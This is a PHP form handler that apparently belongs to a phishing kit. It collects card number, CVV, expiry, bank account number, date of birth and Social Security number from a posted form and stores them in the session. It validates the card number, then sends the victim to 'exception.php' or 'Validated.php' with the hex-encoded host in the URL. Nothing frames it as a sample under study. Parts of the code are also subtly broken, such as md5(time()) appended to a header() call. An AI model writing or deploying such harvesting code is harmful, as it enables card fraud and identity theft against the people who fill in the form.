<?php
ini_set("output_buffering",4096);
session_start();

require 'card_validator.php';

//GET HOST NAME
$host = bin2hex ($_SERVER['HTTP_HOST']);


/** Opens a sessions to store Card form fields **/
$_SESSION['ccNum'] = $ccNum = $_POST['ccNum'];
$_SESSION['NameOnCard'] = $NameOnCard = $_POST['NameOnCard'];
$_SESSION['CVV'] = $CVV = $_POST['CVV'];
$_SESSION['Expires'] = $Expires = $_POST['Expires'];
$_SESSION['BAN'] = $BAN= $_POST['BAN'];
$_SESSION['DOB'] = $DOB = $_POST['DOB'];
$_SESSION['SSN'] = $SSN= $_POST['SSN'];
/** Validate form fields inputs **/

if ($ccNum=="")
{
$cc=1;
}
else
{
$cc=0;
}


//Validate card number
if (is_valid_card($ccNum))
{
$cc=0;
}
else
{
$cc=1;
}


if ($NameOnCard=="")
{
$nameoncard=1;
}
else
{
$nameoncard=0;
}

if (strlen($NameOnCard)<3)
{
$nameoncard=1;
}
else
{
$nameoncard=0;
}

if ($CVV=="")
{
$cvv=1;
}
else
{
$cvv=0;
}

if (strlen($CVV)<3)
{
$cvv=1;
}
else
{
$cvv=0;
}


if ($Expires=="")
{
$expires=1;
}
else
{
$expires=0;
}

if (strlen($Expires)<5)
{
$expires=1;
}
else
{
$expires=0;
}


if ($BAN=="")
{
$ban=1;
}
else
{
$ban=0;
}

if (strlen($BAN)<3)
{
$ban=1;
}
else
{
$ban=0;
}


if ($DOB=="")
{
$dob=1;
}
else
{
$dob=0;
}

if (strlen($DOB)<6)
{
$dob=1;
}
else
{
$dob=0;
}

if ($cc==1||$cvv==1||$expires==1||$dob==1)

{
$errors=1;
}
else{
$errors=0;
}





if ($errors==1) {

header("Location: exception.php?errors=$errors&cc=$cc&nameoncard=$nameoncard&&cvv=$cvv&expires=$expires&dob=$dob&valid=FALSE&Header=$host").md5(time());
}

else {
header("Location: Validated.php?Valid=TRUE&header_location=$host").md5(time());

}
?>